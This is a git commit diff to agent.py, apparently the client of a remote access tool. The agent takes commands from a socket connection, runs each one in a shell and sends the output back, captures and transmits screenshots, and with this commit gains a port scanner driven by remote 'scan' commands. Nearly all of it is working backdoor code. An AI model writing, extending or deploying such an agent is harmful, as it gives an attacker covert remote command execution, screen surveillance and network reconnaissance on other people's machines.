80b2474e3e6d03ad0437c73dd47dc54b039d4112
Maureen Drouard <151353727+maureeend@users.noreply.github.com>
2024-11-24 13:06:41 +0100

    Update agent.py

--- agent.py
+++ agent.py
@@ -18,13 +18,18 @@ def data_socket(s):
 
         if command == "capture":
             screenshot(s)
+        elif command.startswith("scan"):
+            try:
+                _, ip, port_range = command.split()
+                result = scan_port(ip, port_range)
+                s.send(result.encode("utf-8"))
+            except ValueError:
+                s.send(b"Invalid scan command. Use: scan <ip> <start_port>-<end_port>\n")
         else: 
-            execute_command(command)
-        
-        s.close()
+            execute_command(s, command)
 
 # Execute la commande
-def execute_command(command):
+def execute_command(s, command):
     result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout, stderr = result.communicate()
     output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
@@ -44,8 +49,24 @@ def screenshot(s):
     s.send(height.to_bytes(4, 'big'))  
     s.send(image_bin)
 
+# Fonction de scanner de port
+def scan_port(ip, port_range):
+    start, end = map(int, port_range.split("-"))
+    results = []
+    for port in range(start, end + 1):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as port_socket:
+            port_socket.settimeout(2) 
+            conn_result = port_socket.connect_ex((ip, port))  # Teste de la connexion
+            if conn_result == 0:
+                results.append(f"Port {port} is open")
+            else:
+                results.append(f"Port {port} is closed")
+    return "\n".join(results) 
+
 
 if __name__ == "__main__":
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     start_agent(s)
-    data_socket(s)
+
+
+        
